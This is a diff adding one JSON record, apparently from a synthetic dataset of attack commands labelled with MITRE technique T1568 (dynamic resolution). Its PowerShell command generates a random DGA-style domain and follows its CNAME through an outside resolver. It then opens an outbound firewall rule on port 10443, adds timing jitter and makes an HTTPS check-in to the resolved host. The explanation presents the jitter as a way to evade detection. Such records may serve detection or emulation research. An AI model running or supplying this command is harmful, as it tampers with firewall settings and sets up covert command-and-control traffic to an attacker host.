@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1568",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "Invoke-Command -ScriptBlock { $dom=('up{0}.edge-link.co' -f (Get-Random -Min 100 -Max 999)); $cn=Resolve-DnsName $dom -Type CNAME -ErrorAction SilentlyContinue; $target=if($cn){ $cn[0].NameHost.TrimEnd('.') } else { $dom }; $ip=(Resolve-DnsName $target -Type A -Server '9.9.9.9' -ErrorAction SilentlyContinue | Select-Object -First 1).IPAddress; if($ip){ netsh advfirewall firewall add rule name='out_10443' dir=out action=allow protocol=TCP remoteport=10443 | Out-Null; Start-Sleep -Milliseconds (Get-Random -Min 250 -Max 1550); Invoke-WebRequest -Uri ('https://{0}:10443/tele' -f $target) -Headers @{ Host=$dom } -UseBasicParsing -TimeoutSec 7 } }",
+  "explanation": "Resolves a DGA host that may CNAME to an edge host, follows the CNAME to obtain an A record, opens port 10443, adds jitter, and initiates the HTTPS check-in.",
+  "rationale_steps": [
+    "Generate a DGA domain and check for CNAME indirection.",
+    "Resolve the ultimate A record through the indirection chain.",
+    "Permit outbound egress on a non-standard TLS port.",
+    "Contact the target with timing jitter to reduce pattern detection."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1568-5b98f3ee-fcbe818c",
+  "source_prompt_hash": "5b98f3ee",
+  "timestamp_utc": "2025-09-30T09:58:10.642945Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
